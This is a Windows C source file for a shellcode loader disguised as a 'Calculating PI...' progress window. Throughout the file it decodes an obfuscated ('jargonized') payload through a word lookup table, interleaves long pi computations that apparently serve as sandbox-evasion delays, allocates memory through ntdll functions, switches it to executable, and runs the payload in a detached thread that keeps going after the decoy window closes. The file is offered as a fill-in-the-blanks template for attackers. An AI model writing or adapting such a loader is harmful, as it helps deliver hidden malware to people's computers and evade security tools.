#include <windows.h>
#include <commctrl.h>
#include <stdio.h>
#include <string.h>
#include <math.h>

#pragma comment(lib, "comctl32.lib")

#define DEVcode_LEN <SIZE OF SHELLCODE IN BYTES FROM JARGON OUTPUT>
// Adjust timing according to your needs with number of iterations and calculations of PI
#define PI_ITERATIONS 6000
#define TOTAL_PI_CALCULATIONS 6000

const char* translation_table[256] = { <JARGON TRANSLATION TABLE GOES HERE> };

const char* encoded_DEVcode[DEVcode_LEN] = { <JARGONIZED SHELLCODE GOES HERE> };
// Decoded DEVcode buffer
unsigned char DEVcode[DEVcode_LEN];

// Global handles
HWND g_hProgress = NULL;
HWND g_hWnd = NULL;

// Function prototypes
typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(WINAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef DWORD(WINAPI* SafelyRunDEVcode)(LPVOID lpParam);

// Function to decode DEVcode
void decode_DEVcode() {
    for (int sc_index = 0; sc_index < DEVcode_LEN; sc_index++) {
        int found = 0;
        for (int tt_index = 0; tt_index < 256; tt_index++) {
            if (strcmp(translation_table[tt_index], encoded_DEVcode[sc_index]) == 0) {
                DEVcode[sc_index] = (unsigned char)tt_index;
                found = 1;
                break;
            }
        }
        if (!found) {
            MessageBox(NULL, "DEVcode decode error", "Error", MB_OK | MB_ICONERROR);
            exit(1);
        }
    }
}

// Calculate PI
void calculate_pi() {
    long double pi = 0.0;
    long double k, num, den, sum = 0.0;

    for (int i = 0; i < PI_ITERATIONS; i++) {
        k = (long double)i;
        num = ((int)k % 2 == 0 ? 1 : -1) * 
              tgammal(6 * k + 1) * 
              (13591409.0L + 545140134.0L * k);
        den = tgammal(3 * k + 1) * 
              powl(tgammal(k + 1), 3) * 
              powl(640320.0L, 3 * k);
        sum += num / den;
    }
    
    pi = 1.0L / (12 * sum / powl(640320.0L, 1.5L));
}

// Background thread to handle processing
DWORD WINAPI ProcessingThread(LPVOID lpParam) {
    // ============================================
    // FIRST PI CALCULATION - Before Decode
    // ============================================
    for (int i = 0; i < TOTAL_PI_CALCULATIONS; i++) {
        calculate_pi();
        // Update progress: 0% to 20% during first PI calculations
        int progress = ((i + 1) * 20 / TOTAL_PI_CALCULATIONS);
        SendMessage(g_hProgress, PBM_SETPOS, progress, 0);
    }

    // Decode DEVcode
    decode_DEVcode();
    SendMessage(g_hProgress, PBM_SETPOS, 22, 0);

    // ============================================
    // SECOND PI CALCULATION - Between Decode and Get ntdll
    // ============================================
    for (int i = 0; i < TOTAL_PI_CALCULATIONS; i++) {
        calculate_pi();
        // Update progress: 22% to 32% during second PI calculations
        int progress = 22 + ((i + 1) * 10 / TOTAL_PI_CALCULATIONS);
        SendMessage(g_hProgress, PBM_SETPOS, progress, 0);
    }

    // Get ntdll functions
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        PostMessage(g_hWnd, WM_CLOSE, 0, 0);
        return 1;
    }

    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = 
        (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    NtProtectVirtualMemory_t NtProtectVirtualMemory = 
        (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");

    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory) {
        PostMessage(g_hWnd, WM_CLOSE, 0, 0);
        return 1;
    }

    SendMessage(g_hProgress, PBM_SETPOS, 35, 0);

    // ============================================
    // THIRD PI CALCULATION - Before Allocate Memory
    // ============================================
    for (int i = 0; i < TOTAL_PI_CALCULATIONS; i++) {
        calculate_pi();
        // Update progress: 35% to 50% during third PI calculations
        int progress = 35 + ((i + 1) * 15 / TOTAL_PI_CALCULATIONS);
        SendMessage(g_hProgress, PBM_SETPOS, progress, 0);
    }

    // Allocate memory
    PVOID DEVcodeMemory = NULL;
    SIZE_T regionSize = DEVcode_LEN;
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &DEVcodeMemory,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0) {
        PostMessage(g_hWnd, WM_CLOSE, 0, 0);
        return 1;
    }

    SendMessage(g_hProgress, PBM_SETPOS, 55, 0);

    // ============================================
    // FOURTH PI CALCULATION - Between Allocate and Copy
    // ============================================
    for (int i = 0; i < TOTAL_PI_CALCULATIONS; i++) {
        calculate_pi();
        // Update progress: 55% to 65% during fourth PI calculations
        int progress = 55 + ((i + 1) * 10 / TOTAL_PI_CALCULATIONS);
        SendMessage(g_hProgress, PBM_SETPOS, progress, 0);
    }

    memcpy(DEVcodeMemory, DEVcode, DEVcode_LEN);
    SendMessage(g_hProgress, PBM_SETPOS, 70, 0);

    // ============================================
    // FIFTH PI CALCULATION - After Copy Memory
    // ============================================
    for (int i = 0; i < TOTAL_PI_CALCULATIONS; i++) {
        calculate_pi();
        // Update progress: 70% to 85% during fifth PI calculations
        int progress = 70 + ((i + 1) * 15 / TOTAL_PI_CALCULATIONS);
        SendMessage(g_hProgress, PBM_SETPOS, progress, 0);
    }

    // Change memory protection
    ULONG oldProtect;
    status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &DEVcodeMemory,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (status != 0) {
        VirtualFree(DEVcodeMemory, 0, MEM_RELEASE);
        PostMessage(g_hWnd, WM_CLOSE, 0, 0);
        return 1;
    }

    SendMessage(g_hProgress, PBM_SETPOS, 90, 0);

    // Execute DEVcode in independent thread
    SafelyRunDEVcode SafelyRunFunc = (SafelyRunDEVcode)DEVcodeMemory;
    HANDLE hThread = CreateThread(NULL, 0, SafelyRunFunc, DEVcodeMemory, 0, NULL);
    
    if (hThread != NULL) {
        // Detach thread - let it run independently
        CloseHandle(hThread);
    }

    // Window can close now, payload continues independently
    SendMessage(g_hProgress, PBM_SETPOS, 100, 0);
    Sleep(500); // Brief pause to show completion

    // Close the window - payload continues running
    PostMessage(g_hWnd, WM_CLOSE, 0, 0);
    return 0;
}

// Window procedure
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            // Create progress bar
            INITCOMMONCONTROLSEX icex;
            icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
            icex.dwICC = ICC_PROGRESS_CLASS;
            InitCommonControlsEx(&icex);

            g_hProgress = CreateWindowEx(
                0,
                PROGRESS_CLASS,
                NULL,
                WS_CHILD | WS_VISIBLE | PBS_SMOOTH,
                20, 30, 360, 30,
                hwnd,
                NULL,
                GetModuleHandle(NULL),
                NULL
            );

            SendMessage(g_hProgress, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
            SendMessage(g_hProgress, PBM_SETSTEP, 1, 0);

            // Create static text
            CreateWindowEx(
                0,
                "STATIC",
                "Calculating PI...",
                WS_CHILD | WS_VISIBLE | SS_CENTER,
                20, 5, 360, 20,
                hwnd,
                NULL,
                GetModuleHandle(NULL),
                NULL
            );

            // Start processing thread
            CreateThread(NULL, 0, ProcessingThread, NULL, 0, NULL);
            break;
        }
        case WM_CLOSE:
            // Just hide the window, don't terminate the process
            ShowWindow(hwnd, SW_HIDE);
            DestroyWindow(hwnd);
            break;
        case WM_DESTROY:
            // Exit message loop but process continues with payload thread
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WNDCLASSEX wc = {0};
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = "ProgressWindow";

    if (!RegisterClassEx(&wc)) {
        return 1;
    }

    g_hWnd = CreateWindowEx(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        "ProgressWindow",
        "Processing",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
        CW_USEDEFAULT, CW_USEDEFAULT, 400, 100,
        NULL, NULL, hInstance, NULL
    );

    if (!g_hWnd) {
        return 1;
    }

    ShowWindow(g_hWnd, nCmdShow);
    UpdateWindow(g_hWnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Window closed, but process stays alive for payload to continue
    // Sleep indefinitely so process doesn't exit while payload runs
    while (1) {
        Sleep(60000); // Sleep in 1-minute intervals
    }

    return (int)msg.wParam;
}